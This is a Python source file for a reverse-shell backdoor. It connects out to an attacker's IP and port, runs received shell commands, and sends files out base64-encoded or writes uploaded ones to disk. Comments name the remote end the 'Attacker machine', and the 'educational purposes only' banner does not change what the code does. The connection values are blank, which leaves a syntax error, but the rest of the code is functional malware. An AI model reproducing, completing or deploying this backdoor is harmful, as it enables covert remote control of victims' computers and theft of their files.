import socket,json,subprocess,os,base64


##############################################################################
'''                                                                          #
                                                                             #
   This code is provided for educational purposes only. Do good. Be Ethical. #                                                                        
                                                                             #
'''                                                                          # 
##############################################################################



class Backdoor: # backdoor  class 
    
    def __init__(self,IP,PORT): # constarctor 
     self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
     self.connection.connect((IP,PORT)) # take a tuple ip & port

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8")) # enconding the data and sending it as bytes...
    
    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8") # recieving the data and decoding it as string.... 
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_dir(self,path):
        try:
            os.chdir(path)
            return f"cahanging diractory to {path}"
        
        except OSError: # you entered a (cd command with space)
            return f"ERROR: path not found *__*\n"
    
    def execute_sys_command(self,command):
        
        try:
            return subprocess.check_output(command,shell=True).decode("utf-8") # executeing the command
        except subprocess.CalledProcessError:
            return f'Command "{command[0]}" is invalid'

    
    def read_file(self,path): # read a file fucntion
        
        with open(path,"rb") as file: # rb (read as binary file)
           return base64.b64encode(file.read()).decode()
    
    def write_file(self,path,content): # write a file function
        
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."       
    
    def run(self):
        while True:
            command = self.reliable_recieve() # buffer size of received command from Attacker and decodes the received bytes

            if command[0] == "exit":
                print(f"[*] connetion is closed from {IP}:{PORT}...")
                self.connection.close()
                exit()
            
            elif command[0] == "cd" and len(command) > 1:  # to check the commands that enters not only cd (cd and argument)
               command_result = self.change_dir(command[1])  

            elif command[0] == "download": # read the file contents and send it to the Attacker machine
                command_result = self.read_file(command[1]) # name or path of file..
            
            elif command[0] == "upload":
                command_result = self.write_file(command[1],command[2])
            
            else: # only cd without argument
                command_result= self.execute_sys_command(command) # send command to subprocess function to execute that command
            
            self.reliable_send(command_result) # send the result of execution to Attacker machine as bytes
    

        
       


IP = "" # Listener Ip address ** IP of attacker machine **
PORT = # Port to establish the connection 

MY_BACKDOOR = Backdoor(IP,PORT)
MY_BACKDOOR.run()
